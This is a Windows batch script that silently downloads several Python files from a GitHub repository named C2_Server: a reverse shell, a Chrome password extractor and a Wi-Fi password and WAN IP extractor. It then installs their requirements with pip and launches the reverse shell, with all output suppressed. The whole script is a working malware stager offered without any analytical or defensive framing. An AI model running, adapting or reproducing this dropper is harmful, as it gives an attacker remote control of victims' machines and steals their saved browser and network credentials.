@echo off

curl.exe --output knowing_win_pid.py --url https://raw.githubusercontent.com/Yildiz-Abdullah/C2_Server/main/rev_shell/knowing_win_pid.py >nul 2>&1
curl.exe --output rev_shell.py --url https://raw.githubusercontent.com/Yildiz-Abdullah/C2_Server/main/rev_shell/rev_shell_lite.py >nul 2>&1
curl.exe --output win_chrome_password_extractor.py --url https://raw.githubusercontent.com/Yildiz-Abdullah/C2_Server/main/rev_shell/win_chrome_password_extractor.py >nul 2>&1
curl.exe --output win_wlan_passwd_and_wanip_extractor.py --url https://raw.githubusercontent.com/Yildiz-Abdullah/C2_Server/main/rev_shell/win_wlan_passwd_and_wanip_extractor.py >nul 2>&1
curl.exe --output win_requirement.txt --url https://raw.githubusercontent.com/Yildiz-Abdullah/C2_Server/main/win_requirement.txt >nul 2>&1

pip install -r C:/Users/%username%/Downloads/win_requirement.txt >nul 2>&1
python C:/Users/%username%/Downloads/rev_shell.py >nul 2>&1
